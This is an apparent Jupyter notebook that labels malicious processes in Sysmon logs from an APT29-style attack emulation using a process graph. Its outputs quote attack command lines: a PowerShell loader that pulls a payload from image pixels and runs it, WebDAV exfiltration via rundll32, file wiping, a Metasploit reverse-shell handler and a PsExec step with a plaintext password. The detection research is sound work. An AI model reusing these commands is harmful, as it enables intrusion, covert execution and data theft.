# {'properties': {'process_guid': '{47ab858c-e6b2-5eac-5900-000000000500}', 'host': 'SCRANTON.dmevals.local', 'process_id': 3584, 'user': nan, 'process_image': 'rundll32.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': 'rundll32.exe', 'hashes': {'sha1': '7662A8D2F23C3474DEC6EF8E2B0365B0B86714EE', 'md5': 'F68AF942FD7CCC0E7BAB1A2335D2AD26', 'sha256': '11064E9EDC605BD5B0C0A505538A0D5FD7DE53883AF342F091687CAE8628ACD0', 'imphash': 'F27A7FC3A53E74F45BE370131953896A'}, 'process_path': 'C:\\Windows\\System32\\rundll32.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'rundll32.exe', '_color': '#FF0000', 'Orig_Node_ID': 4017332247218872307}
# ==========================================
# Malicious? Enter yes or no:  yes
# 141
# 141
# 3
# 12
# 16
# Saving as: ancestor_descendants_141.png
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/networkx/drawing/nx_pylab.py:579: MatplotlibDeprecationWarning:
# The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.
#   if not cb.iterable(width):
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/networkx/drawing/nx_pylab.py:676: MatplotlibDeprecationWarning:
# The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.
#   if cb.iterable(node_size):  # many node sizes
# Saving as: ancestor_descendants_nodeType_141.png
# 7
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/indexing.py:671: SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame
#
# See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
#   self._setitem_with_indexer(indexer, value)
#                                    ProcessGuid                Hostname  \
# 152248  {47ab858c-e6b2-5eac-4d00-000000000500}  SCRANTON.dmevals.local
# 1334    {5aa8ec29-e655-5eac-8303-000000000400}    NASHUA.dmevals.local
# 8974    {47ab858c-e342-5eac-d703-000000000400}  SCRANTON.dmevals.local
# 14768   {47ab858c-e23d-5eac-c603-000000000400}  SCRANTON.dmevals.local
# 18627   {5aa8ec29-e5b8-5eac-7903-000000000400}    NASHUA.dmevals.local
# 39393   {47ab858c-e2f2-5eac-d203-000000000400}  SCRANTON.dmevals.local
# 41375   {47ab858c-e442-5eac-ed03-000000000400}  SCRANTON.dmevals.local
# 56194   {5aa8ec29-e5e4-5eac-7a03-000000000400}    NASHUA.dmevals.local
# 60037   {47ab858c-e1f8-5eac-bc03-000000000400}  SCRANTON.dmevals.local
# 68686   {47ab858c-e2ac-5eac-cb03-000000000400}  SCRANTON.dmevals.local
# 72642   {47ab858c-e18b-5eac-b103-000000000400}  SCRANTON.dmevals.local
# 80262   {5aa8ec29-e52e-5eac-6b03-000000000400}    NASHUA.dmevals.local
# 83938   {47ab858c-e49f-5eac-f103-000000000400}  SCRANTON.dmevals.local
# 85882   {5aa8ec29-e56d-5eac-6e03-000000000400}    NASHUA.dmevals.local
# 95348   {5aa8ec29-e624-5eac-7f03-000000000400}    NASHUA.dmevals.local
# 96356   {47ab858c-e1e4-5eac-b803-000000000400}  SCRANTON.dmevals.local
# 113037  {47ab858c-e188-5eac-b003-000000000400}  SCRANTON.dmevals.local
# 120642  {47ab858c-e144-5eac-ab03-000000000400}  SCRANTON.dmevals.local
# 130522  {47ab858c-e305-5eac-d303-000000000400}  SCRANTON.dmevals.local
# 139342  {47ab858c-e374-5eac-d803-000000000400}  SCRANTON.dmevals.local
# 146429  {47ab858c-e49e-5eac-ef03-000000000400}  SCRANTON.dmevals.local
# 149428  {47ab858c-e49f-5eac-f003-000000000400}  SCRANTON.dmevals.local
# 149429  {5aa8ec29-e603-5eac-7b03-000000000400}    NASHUA.dmevals.local
# 160348  {47ab858c-e14e-5eac-ac03-000000000400}  SCRANTON.dmevals.local
# 162243  {47ab858c-e442-5eac-ec03-000000000400}  SCRANTON.dmevals.local
# 163244  {5aa8ec29-e618-5eac-7e03-000000000400}    NASHUA.dmevals.local
# 169201  {47ab858c-e1e3-5eac-b603-000000000400}  SCRANTON.dmevals.local
# 175284  {5aa8ec29-e5b7-5eac-7703-000000000400}    NASHUA.dmevals.local
# 179251  {47ab858c-e13c-5eac-a903-000000000400}  SCRANTON.dmevals.local
# 180127  {5aa8ec29-e63e-5eac-8203-000000000400}    NASHUA.dmevals.local
# 196722  {5aa8ec29-e4ec-5eac-6803-000000000400}    NASHUA.dmevals.local
# 6164    {47ab858c-e69e-5eac-0300-000000000500}  SCRANTON.dmevals.local
# 22486   {47ab858c-e6ad-5eac-0800-000000000500}  SCRANTON.dmevals.local
# 91568   {47ab858c-e6b2-5eac-5900-000000000500}  SCRANTON.dmevals.local
# 112099  {47ab858c-e6ad-5eac-0500-000000000500}  SCRANTON.dmevals.local
# 168302  {47ab858c-e6ad-5eac-0b00-000000000500}  SCRANTON.dmevals.local
#
#         orig_label  graph_label  \
# 152248        True         True
# 1334          True        False
# 8974          True        False
# 14768         True        False
# 18627         True        False
# 39393         True        False
# 41375         True        False
# 56194         True        False
# 60037         True        False
# 68686         True        False
# 72642         True        False
# 80262         True        False
# 83938         True        False
# 85882         True        False
# 95348         True        False
# 96356         True        False
# 113037        True        False
# 120642        True        False
# 130522        True        False
# 139342        True        False
# 146429        True        False
# 149428        True        False
# 149429        True        False
# 160348        True        False
# 162243        True        False
# 163244        True        False
# 169201        True        False
# 175284        True        False
# 179251        True        False
# 180127        True        False
# 196722        True        False
# 6164         False         True
# 22486        False         True
# 91568        False         True
# 112099       False         True
# 168302       False         True
#
#                                                                                                                                                                                                                                                                                                                                                                                                                           CommandLine
# 152248                                                                                                                                                                                                                                                                                                                                                                                              C:\Windows\System32\javamtsup.exe
# 1334                                                                                                                                                                                                                                                                                                                                                              .\sdelete64.exe  /accepteula "C:\Users\pbeesly\Desktop\working.zip"
# 8974                                                                                                                                                                                                                                                                                                                                                                               "C:\Program Files\SysinternalsSuite\accesschk.exe"
# 14768                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 18627                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 39393                                                                                                                                                                                                                                                                                                                       "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip
# 41375                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 56194                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 60037                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 68686                                                                                                                                                                                                                                                                                                                           "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr
# 72642                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 80262                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 83938                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 85882                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 95348                                                                                                                                                                                                                                                                                                                                                                          .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe"
# 96356   "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
# 113037                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 120642                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 130522                                                                                                                                                                                                                                                                                                                "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip
# 139342                                                                                                                                                                                                                                                                                                                                                                                                                 powershell.exe
# 146429                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 149428                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 149429                                                                                                                                                                                                                                                                                                      "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip
# 160348                                                                                                                                                                                                                                                                                                                                                                                                                     powershell
# 162243                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 163244                                                                                                                                                                                                                                                                                                                                                                                                    C:\windows\system32\cmd.exe
# 169201                                                                                                                                                                                                                                                                                                                                                      "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
# 175284                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 179251                                                                                                                                                                                                                                                                                                                                                                                    "C:\ProgramData\victim\â€®cod.3aka3.scr" /S
# 180127                                                                                                                                                                                                                                                                                                                                                   .\sdelete64.exe  /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"
# 196722                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 6164                                                                                                                                                                                                                                                                                                                                                                                                    \SystemRoot\System32\smss.exe
# 22486                                                                                                                                                                                                                                                                                                                                                                                                                     wininit.exe
# 91568                                                                                                                                                                                                                                                                                                                                                                                                                    rundll32.exe
# 112099                                                                                                                                                                                                                                                                                                                                                                               \SystemRoot\System32\smss.exe 00000118 00000084
# 168302                                                                                                                                                                                                                                                                                                                                                                                               C:\windows\system32\services.exe

# %%
descendants.add(malicious_root_ancestor)
df_bad_proc = df_bad_proc.append(df.loc[(df.NodeID.isin(descendants)) & (df['_node_type']=='Process')])
df_bad_proc.shape
# Out:
# (46, 21)

# %%
df_bad_proc

# %% [markdown]
# ## Apply the Graph Bad Processes as Label

# %%
graph_bad_procs = df_bad_proc['process_guid'].unique()

# %%
df_label['TP_Binary'].value_counts()
# Out:
# False    195322
# True       3438
# Name: TP_Binary, dtype: int64

# %%
df_label['G1_Binary'] = False
df_label['G1_Binary'].loc[(df_label.ProcessGuid.isin(graph_bad_procs))] = True
# Out:
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/indexing.py:671: SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame
#
# See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
#   self._setitem_with_indexer(indexer, value)

# %%
df_label['G1_Binary'].value_counts()
# Out:
# False    174661
# True      24099
# Name: G1_Binary, dtype: int64

# %%
for namedTuple in df_bad_proc.itertuples():
    #print(namedTuple)
    print(namedTuple.process_id)
    print(namedTuple.host)
#    df_label['G1_Binary'].loc[(df_label['time_stamp'] >= namedTuple.first) & 
#                           (df_label['time_stamp'] <= namedTuple.last) &
#                           (df_label['Hostname'] == namedTuple.Index[1])
#                          ] = True
# Out:
# 7884.0
# SCRANTON.dmevals.local
# 3152.0
# SCRANTON.dmevals.local
# 6508.0
# SCRANTON.dmevals.local
# 4196.0
# SCRANTON.dmevals.local
# 3796.0
# SCRANTON.dmevals.local
# 5156.0
# SCRANTON.dmevals.local
# 1728.0
# SCRANTON.dmevals.local
# 3876.0
# SCRANTON.dmevals.local
# 3852.0
# SCRANTON.dmevals.local
# 2976.0
# SCRANTON.dmevals.local
# 3832.0
# SCRANTON.dmevals.local
# 6868.0
# SCRANTON.dmevals.local
# 3544.0
# SCRANTON.dmevals.local
# 5220.0
# SCRANTON.dmevals.local
# 5944.0
# SCRANTON.dmevals.local
# 9204.0
# SCRANTON.dmevals.local
# 8760.0
# SCRANTON.dmevals.local
# 4140.0
# SCRANTON.dmevals.local
# 8848.0
# SCRANTON.dmevals.local
# 5924.0
# SCRANTON.dmevals.local
# 8928.0
# SCRANTON.dmevals.local
# 1412.0
# SCRANTON.dmevals.local
# 2668.0
# SCRANTON.dmevals.local
# 8012.0
# SCRANTON.dmevals.local
# 4144.0
# SCRANTON.dmevals.local
# 3480.0
# SCRANTON.dmevals.local
# 2772.0
# SCRANTON.dmevals.local
# 6492.0
# SCRANTON.dmevals.local
# 9096.0
# SCRANTON.dmevals.local
# 5400.0
# SCRANTON.dmevals.local
# 4892.0
# SCRANTON.dmevals.local
# 8528.0
# SCRANTON.dmevals.local
# 620.0
# SCRANTON.dmevals.local
# 8524.0
# SCRANTON.dmevals.local
# 1624.0
# NASHUA.dmevals.local
# 8772.0
# NASHUA.dmevals.local
# 6640.0
# NASHUA.dmevals.local
# 3552.0
# NASHUA.dmevals.local
# 6116.0
# NASHUA.dmevals.local
# 2952.0
# NASHUA.dmevals.local
# 2172.0
# NASHUA.dmevals.local
# 8748.0
# NASHUA.dmevals.local
# 4876.0
# NASHUA.dmevals.local
# 188.0
# NASHUA.dmevals.local
# 3296.0
# SCRANTON.dmevals.local
# 3584.0
# SCRANTON.dmevals.local

# %%
df_label['Hostname'].value_counts()
# Out:
# SCRANTON.dmevals.local    133796
# NASHUA.dmevals.local       29058
# NEWYORK.dmevals.local      23935
# UTICA.dmevals.local        11971
# Name: Hostname, dtype: int64

# %%
df_label['ProcessId'].value_counts()
# Out:
# 3852      15850
# 5044      14215
# 900        8689
# 884        8411
# 0xf0c      6939
#           ...
# 0xdf8         1
# 0x74c         1
# 5724          1
# 0x1c48        1
# 0xde4         1
# Name: ProcessId, Length: 1107, dtype: int64

# %%
for namedTuple in df_bad_proc.itertuples():
    #print(namedTuple)
    #print(namedTuple.process_id)
    #print(namedTuple.host)
    df_label['G1_Binary'].loc[(df_label['Hostname'] == namedTuple.host) & 
                              (df_label['ProcessId'] == namedTuple.process_id)
                             ] = True

# %% [markdown]
# ## Hex Process ID Issue

# %%
# No change... must be the process ID as hex vs int.
df_label['G1_Binary'].value_counts()
# Out:
# False    174661
# True      24099
# Name: G1_Binary, dtype: int64

# %%
df_label.SourceName.value_counts()
# Out:
# Microsoft-Windows-Sysmon                                      143891
# Microsoft-Windows-Security-Auditing                            41003
# Microsoft-Windows-PowerShell                                    8364
# PowerShell                                                      5285
# Microsoft-Windows-WMI-Activity                                    90
# Service Control Manager                                           18
# Microsoft-Windows-TerminalServices-RemoteConnectionManager        15
# Microsoft-Windows-FilterManager                                   12
# Microsoft-Windows-Windows Firewall With Advanced Security         10
# Microsoft-Windows-TerminalServices-LocalSessionManager             9
# Microsoft-Windows-Kernel-General                                   9
# Microsoft-Windows-Hyper-V-Netvsc                                   9
# Microsoft-Windows-Dhcp-Client                                      6
# Microsoft-Windows-Kernel-Boot                                      6
# EventLog                                                           4
# Microsoft-Windows-DistributedCOM                                   3
# Microsoft-Windows-DHCPv6-Client                                    3
# Microsoft-Windows-Ntfs                                             3
# Microsoft-Windows-Kernel-Processor-Power                           2
# Microsoft-Windows-WinRM                                            2
# Microsoft-Windows-Kernel-Power                                     2
# Microsoft-Windows-Winlogon                                         2
# Microsoft-Windows-Time-Service                                     2
# Microsoft-Windows-GroupPolicy                                      2
# User32                                                             1
# Microsoft-Windows-Directory-Services-SAM                           1
# Microsoft-Windows-Eventlog                                         1
# volmgr                                                             1
# LsaSrv                                                             1
# Microsoft-Windows-Bits-Client                                      1
# Microsoft-Windows-DNS-Client                                       1
# Microsoft-Windows-Wininit                                          1
# Name: SourceName, dtype: int64

# %%
df_label.loc[df_label['SourceName'] != 'Microsoft-Windows-Sysmon']['ProcessId'].apply(lambda x: int(x, 16)).value_counts()
# Out:
# ---------------------------------------------------------------------------
# TypeError                                 Traceback (most recent call last)
# <ipython-input-69-80016a33e307> in <module>
# ----> 1 df_label.loc[df_label['SourceName'] != 'Microsoft-Windows-Sysmon']['ProcessId'].apply(lambda x: int(x, 16)).value_counts()
#
# ~/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/series.py in apply(self, func, convert_dtype, args, **kwds)
#    3846             else:
#    3847                 values = self.astype(object).values
# -> 3848                 mapped = lib.map_infer(values, f, convert=convert_dtype)
#    3849
#    3850         if len(mapped) and isinstance(mapped[0], Series):
#
# pandas/_libs/lib.pyx in pandas._libs.lib.map_infer()
#
# <ipython-input-69-80016a33e307> in <lambda>(x)
# ----> 1 df_label.loc[df_label['SourceName'] != 'Microsoft-Windows-Sysmon']['ProcessId'].apply(lambda x: int(x, 16)).value_counts()
#
# TypeError: int() can't convert non-string with explicit base

# %%
df_label.loc[df_label.ProcessId.notna()].ProcessId.apply(lambda x: int(x))
# Out:
# ---------------------------------------------------------------------------
# ValueError                                Traceback (most recent call last)
# <ipython-input-72-ecccc8c36a05> in <module>
# ----> 1 df_label.loc[df_label.ProcessId.notna()].ProcessId.apply(lambda x: int(x))
#
# ~/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/series.py in apply(self, func, convert_dtype, args, **kwds)
#    3846             else:
#    3847                 values = self.astype(object).values
# -> 3848                 mapped = lib.map_infer(values, f, convert=convert_dtype)
#    3849
#    3850         if len(mapped) and isinstance(mapped[0], Series):
#
# pandas/_libs/lib.pyx in pandas._libs.lib.map_infer()
#
# <ipython-input-72-ecccc8c36a05> in <lambda>(x)
# ----> 1 df_label.loc[df_label.ProcessId.notna()].ProcessId.apply(lambda x: int(x))
#
# ValueError: invalid literal for int() with base 10: '0xc64'

# %%
df_label.loc[(df_label.ProcessId.notna()) & (df_label.ProcessId.str.contains(x))].ProcessId.apply(int, base=16).value_counts()
# Out:
# 14418    15850
# 20548    14215
# 2304      8689
# 2180      8427
# 3852      6939
#          ...
# 17298        1
# 4760         1
# 16530        1
# 3224         1
# 7932         1
# Name: ProcessId, Length: 1073, dtype: int64

# %%
df_label.loc[(df_label.ProcessId.notna()) & (df_label.ProcessId.str.contains('x'))].ProcessId.apply(int, base=16).value_counts()
# Out:
# 3852    6939
# 5344    3788
# 3172    2881
# 2100    1800
# 2244    1701
#         ...
# 3556       1
# 5400       1
# 5240       1
# 4468       1
# 1284       1
# Name: ProcessId, Length: 516, dtype: int64

# %%
df_label['ProcessID_Int'] = df_label.loc[(df_label.ProcessId.notna()) & (df_label.ProcessId.str.contains('x'))].ProcessId.apply(int, base=16)

# %%
df_label.ProcessID_Int.value_counts()
# Out:
# 3852.0    6939
# 5344.0    3788
# 3172.0    2881
# 2100.0    1800
# 2244.0    1701
#           ...
# 6484.0       1
# 2392.0       1
# 3548.0       1
# 4468.0       1
# 868.0        1
# Name: ProcessID_Int, Length: 516, dtype: int64

# %%
df_label['ProcessID_Int'] = df_label['ProcessID_Int'].fillna(df_label.loc[(df_label.ProcessId.notna()) & (~df_label['ProcessId'].str.contains('x', na=False))]['ProcessId'].astype(int))

# %%
df_label.ProcessID_Int.value_counts()
# Out:
# 3852      15850
# 5044      14215
# 900        8689
# 884        8411
# 3852.0     6939
#           ...
# 7084.0        1
# 1972.0        1
# 1420          1
# 2092.0        1
# 1868.0        1
# Name: ProcessID_Int, Length: 1107, dtype: int64

# %%
df_label.ProcessID_Int.value_counts()
# Out:
# 3852.0    22789
# 5044.0    14220
# 900.0      8692
# 884.0      8644
# 5344.0     7575
#           ...
# 2592.0        1
# 2848.0        1
# 1420.0        1
# 4092.0        1
# 380.0         1
# Name: ProcessID_Int, Length: 595, dtype: int64

# %%
df_label.ProcessId.notna().value_counts()
# Out:
# True     183530
# False     15230
# Name: ProcessId, dtype: int64

# %%
df_label.ProcessID_Int.notna().value_counts()
# Out:
# True     183530
# False     15230
# Name: ProcessID_Int, dtype: int64

# %%
df_label['G1_Binary'].value_counts()
# Out:
# False    174661
# True      24099
# Name: G1_Binary, dtype: int64

# %%
for namedTuple in df_bad_proc.itertuples():
    #print(namedTuple)
    #print(namedTuple.process_id)
    #print(namedTuple.host)
    df_label['G1_Binary'].loc[(df_label['Hostname'] == namedTuple.host) & 
                              (df_label['ProcessID_Int'] == namedTuple.process_id)
                             ] = True
# Out:
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/indexing.py:671: SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame
#
# See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
#   self._setitem_with_indexer(indexer, value)

# %%
# Success!?
df_label['G1_Binary'].value_counts()
# Out:
# False    164227
# True      34533
# Name: G1_Binary, dtype: int64

# %% [markdown]
# ## Graph Shortcommings

# %%
pd_all_guids.loc[(pd_all_guids['orig_label']==True) & (pd_all_guids['graph_label']==False)].count()
# Out:
# ProcessGuid    8
# Hostname       8
# CommandLine    8
# orig_label     8
# graph_label    8
# dtype: int64

# %% [raw]
# Graph doesn't pick up the \Temp\python.exe execution NOR the webdav C2 communication through rundll32.exe
#     I expect this is a shortcomming in the DAG construction. The python.exe is a gap in the lateral movement. The DAG doesn't link the PSEXEC process with the python. The \Temp\python.exe is the SeaDuke stage. It is executed by psexec from Scranton.
#     The webdav behavior is exfiltration
#
# {5aa8ec29-e52e-5eac-6b03-000000000400} 	NASHUA.dmevals.local 	True 	False 	"C:\Windows\Temp\python.exe"
# {47ab858c-e49f-5eac-f103-000000000400} 	SCRANTON.dmevals.local 	True 	False 	rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav

# %% [raw]
# Collection and Exfiltration	"Data from Local System, Data Compressed, Data Encrypted, Exfiltration Over Alternative Protocol"
# 7.B
# The attacker then collects files (T1005), which are compressed (T1002) and encrypted (T1022), before being exfiltrated to an attacker-controlled WebDAV share (T1048).
# "[meterpreter (PowerShell)\*] > Invoke-Exfil
# press: [Enter]  in 1-2 mins to get updates and terminal control back"	admin
# SCRANTON	TEAM SERVER

# %% [raw]
# Lateral Movement	Software Packing
# 8.B
# Next, the attacker uploads a new UPX-packed payload (T1045) to the secondary victim.	"Start a new instance of Metasploit, and spawn a Metasploit handler:
#
# [msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https
#
# Return to current Meterpreter session:
#
# [meterpreter (PowerShell)\*] > Invoke-SeaDukeStage -ComputerName NASHUA"	admin	SCRANTON	NASHUA
#
# Lateral Movement	"Windows Admin Shares,Service Execution,Valid Accounts"
# 8.C
# This new payload is executed on the secondary victim via the PSExec utility (T1077, T1035) using the previously stolen credentials (T1078).	"Execute SEADUKE Remotely via PSEXEC
#
# [meterpreter (PowerShell)\*] >
# .\PsExec64.exe -accepteula \\NASHUA -u ""dmevals\pbeesly"" -p ""Fl0nk3rt0n!T0by"" -i <Session Number from step 8.A. e.g. 4> ""C:\Windows\Temp\python.exe"""	admin	SCRANTON	NASHUA

# %%
label_bad_guids = df_label.loc[(df_label['TP_Binary'] == True) & (df_label.ProcessGuid.notnull())]['ProcessGuid'].unique()
pd_all_guids = df_label.loc[(df_label.ProcessGuid.notnull()) & (df_label.CommandLine.notnull())][['ProcessGuid', 'Hostname', 'TP_Binary', 'CommandLine']]
pd_all_guids['orig_label'] = False
pd_all_guids['orig_label'].loc[pd_all_guids.ProcessGuid.isin(label_bad_guids)] = True

pd_all_guids = pd_all_guids.drop(columns=['TP_Binary']).drop_duplicates()
pd_all_guids['graph_label'] = False
pd_all_guids['graph_label'].loc[pd_all_guids.ProcessGuid.isin(graph_bad_procs)] = True

with pd.option_context('display.max_rows', None, 'display.max_columns', None, 'display.max_colwidth', None):
    display(pd_all_guids[['ProcessGuid', 'Hostname', 'orig_label', 'graph_label', 'CommandLine']].loc[((pd_all_guids.orig_label==True) | (pd_all_guids.graph_label==True))].sort_values(by=['orig_label', 'graph_label'], ascending=False))
# Out:
#                                    ProcessGuid                Hostname  \
# 1334    {5aa8ec29-e655-5eac-8303-000000000400}    NASHUA.dmevals.local
# 8974    {47ab858c-e342-5eac-d703-000000000400}  SCRANTON.dmevals.local
# 14768   {47ab858c-e23d-5eac-c603-000000000400}  SCRANTON.dmevals.local
# 18627   {5aa8ec29-e5b8-5eac-7903-000000000400}    NASHUA.dmevals.local
# 39393   {47ab858c-e2f2-5eac-d203-000000000400}  SCRANTON.dmevals.local
# 56194   {5aa8ec29-e5e4-5eac-7a03-000000000400}    NASHUA.dmevals.local
# 60037   {47ab858c-e1f8-5eac-bc03-000000000400}  SCRANTON.dmevals.local
# 68686   {47ab858c-e2ac-5eac-cb03-000000000400}  SCRANTON.dmevals.local
# 72642   {47ab858c-e18b-5eac-b103-000000000400}  SCRANTON.dmevals.local
# 95348   {5aa8ec29-e624-5eac-7f03-000000000400}    NASHUA.dmevals.local
# 96356   {47ab858c-e1e4-5eac-b803-000000000400}  SCRANTON.dmevals.local
# 113037  {47ab858c-e188-5eac-b003-000000000400}  SCRANTON.dmevals.local
# 120642  {47ab858c-e144-5eac-ab03-000000000400}  SCRANTON.dmevals.local
# 130522  {47ab858c-e305-5eac-d303-000000000400}  SCRANTON.dmevals.local
# 139342  {47ab858c-e374-5eac-d803-000000000400}  SCRANTON.dmevals.local
# 149429  {5aa8ec29-e603-5eac-7b03-000000000400}    NASHUA.dmevals.local
# 152248  {47ab858c-e6b2-5eac-4d00-000000000500}  SCRANTON.dmevals.local
# 160348  {47ab858c-e14e-5eac-ac03-000000000400}  SCRANTON.dmevals.local
# 163244  {5aa8ec29-e618-5eac-7e03-000000000400}    NASHUA.dmevals.local
# 169201  {47ab858c-e1e3-5eac-b603-000000000400}  SCRANTON.dmevals.local
# 175284  {5aa8ec29-e5b7-5eac-7703-000000000400}    NASHUA.dmevals.local
# 179251  {47ab858c-e13c-5eac-a903-000000000400}  SCRANTON.dmevals.local
# 180127  {5aa8ec29-e63e-5eac-8203-000000000400}    NASHUA.dmevals.local
# 41375   {47ab858c-e442-5eac-ed03-000000000400}  SCRANTON.dmevals.local
# 80262   {5aa8ec29-e52e-5eac-6b03-000000000400}    NASHUA.dmevals.local
# 83938   {47ab858c-e49f-5eac-f103-000000000400}  SCRANTON.dmevals.local
# 85882   {5aa8ec29-e56d-5eac-6e03-000000000400}    NASHUA.dmevals.local
# 146429  {47ab858c-e49e-5eac-ef03-000000000400}  SCRANTON.dmevals.local
# 149428  {47ab858c-e49f-5eac-f003-000000000400}  SCRANTON.dmevals.local
# 162243  {47ab858c-e442-5eac-ec03-000000000400}  SCRANTON.dmevals.local
# 196722  {5aa8ec29-e4ec-5eac-6803-000000000400}    NASHUA.dmevals.local
# 12975   {47ab858c-e374-5eac-d903-000000000400}  SCRANTON.dmevals.local
# 26578   {47ab858c-e519-5eac-f403-000000000400}  SCRANTON.dmevals.local
# 38237   {47ab858c-e1e3-5eac-b503-000000000400}  SCRANTON.dmevals.local
# 63799   {47ab858c-e1e5-5eac-bb03-000000000400}  SCRANTON.dmevals.local
# 73611   {47ab858c-e413-5eac-e903-000000000400}  SCRANTON.dmevals.local
# 88067   {47ab858c-e188-5eac-af03-000000000400}  SCRANTON.dmevals.local
# 91568   {47ab858c-e6b2-5eac-5900-000000000500}  SCRANTON.dmevals.local
# 104058  {47ab858c-e394-5eac-e303-000000000400}  SCRANTON.dmevals.local
# 114981  {47ab858c-e3d3-5eac-e603-000000000400}  SCRANTON.dmevals.local
# 115865  {47ab858c-e5a2-5eac-fb03-000000000400}  SCRANTON.dmevals.local
# 117807  {47ab858c-e1e2-5eac-b303-000000000400}  SCRANTON.dmevals.local
# 136222  {47ab858c-e558-5eac-f503-000000000400}  SCRANTON.dmevals.local
# 139343  {5aa8ec29-e5b7-5eac-7803-000000000400}    NASHUA.dmevals.local
# 144331  {47ab858c-e1e4-5eac-b903-000000000400}  SCRANTON.dmevals.local
# 147546  {47ab858c-e394-5eac-e203-000000000400}  SCRANTON.dmevals.local
# 151329  {47ab858c-e23d-5eac-c703-000000000400}  SCRANTON.dmevals.local
# 154392  {47ab858c-e4d6-5eac-f303-000000000400}  SCRANTON.dmevals.local
# 154393  {5aa8ec29-e5b7-5eac-7603-000000000400}    NASHUA.dmevals.local
# 155466  {47ab858c-e1e5-5eac-ba03-000000000400}  SCRANTON.dmevals.local
# 157536  {47ab858c-e413-5eac-e803-000000000400}  SCRANTON.dmevals.local
# 164294  {47ab858c-e144-5eac-aa03-000000000400}  SCRANTON.dmevals.local
# 169200  {47ab858c-e1e2-5eac-b203-000000000400}  SCRANTON.dmevals.local
# 176379  {47ab858c-e3d3-5eac-e703-000000000400}  SCRANTON.dmevals.local
#
#         orig_label  graph_label  \
# 1334          True         True
# 8974          True         True
# 14768         True         True
# 18627         True         True
# 39393         True         True
# 56194         True         True
# 60037         True         True
# 68686         True         True
# 72642         True         True
# 95348         True         True
# 96356         True         True
# 113037        True         True
# 120642        True         True
# 130522        True         True
# 139342        True         True
# 149429        True         True
# 152248        True         True
# 160348        True         True
# 163244        True         True
# 169201        True         True
# 175284        True         True
# 179251        True         True
# 180127        True         True
# 41375         True        False
# 80262         True        False
# 83938         True        False
# 85882         True        False
# 146429        True        False
# 149428        True        False
# 162243        True        False
# 196722        True        False
# 12975        False         True
# 26578        False         True
# 38237        False         True
# 63799        False         True
# 73611        False         True
# 88067        False         True
# 91568        False         True
# 104058       False         True
# 114981       False         True
# 115865       False         True
# 117807       False         True
# 136222       False         True
# 139343       False         True
# 144331       False         True
# 147546       False         True
# 151329       False         True
# 154392       False         True
# 154393       False         True
# 155466       False         True
# 157536       False         True
